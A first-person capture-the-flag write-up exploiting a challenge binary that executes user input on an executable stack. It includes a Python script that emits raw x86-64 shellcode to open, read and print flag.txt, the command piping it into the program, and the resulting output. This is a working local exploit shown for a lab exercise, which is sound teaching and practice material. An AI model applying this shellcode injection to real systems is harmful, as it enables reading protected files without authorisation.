I went into this blindly, just trying inputs to see how the program reacted. Some inputs, like `ls`, gave the message “Ewww bro, I won't eat that...”. Others, like just `a`, caused a segfault. From glancing at the assembly, I noticed it compares my input with some blacklist string — I didn’t fully dig into it, but it seemed to reject any input containing letters from “binsh”.

What caught my interest more was the segfault. I wasn’t even inputting large strings, yet it crashed. So I loaded it in GDB and set breakpoints to figure out where the segfault was coming from. Turns out, it happened right after `main` returned — the return address had been overwritten with a pointer to my input. When I inspected the stack (`x/s $rsp`), I saw it was trying to execute my string `"a\n"`. It was literally treating my input as instructions and jumping to it.

The stack was executable. And if I gave it valid shellcode, it would actually run it. Since the program runs with a group that can read `flag.txt`, I could use this to my advantage.

I grabbed shellcode online that opens `flag.txt`, reads it, and prints the content to stdout. I wrote this Python script to output the shellcode as raw bytes:

```python
#!/usr/bin/env python3
import sys

# Shellcode to open "flag.txt", read its contents, and print to stdout (equivalent of 'cat flag.txt')
shellcode = (
    b"\x48\x31\xc0\x50\x48\xbb\x66\x6c\x61\x67\x2e\x74\x78\x74\x53\x48\x89\xe7"  # "flag.txt" to the stack
    b"\x48\x31\xf6\xb0\x02\x0f\x05"  # open("flag.txt", O_RDONLY)
    b"\x48\x89\xc7\x48\x89\xe6\xba\x64\x00\x00\x00\xb0\x00\x0f\x05"  # read(fd, rsp, 100)
    b"\xbf\x01\x00\x00\x00\xb0\x01\x0f\x05"  # write(1, rsp, 100)
)

# Output the shellcode directly to the system's standard output
sys.stdout.buffer.write(shellcode)
```

Then ran:

```bash
alexturing@shell:/problems/e1a07f32d4a859b57d0cef65593ae658$ python3 ~/paylaod1.py | ./fatty1
Give me food: 751b097686200c9da81a526b2ca6b2b2
���(����(��(��E6�	���(���b�
                                 V 0�v~�(VBSegmentation fault
```

And it worked — the flag was printed. There was some garbage after it, but that’s just because `write()` dumped a fixed 100 bytes regardless of how long the flag was. I wasn’t trying to be clean — I just wanted the flag.
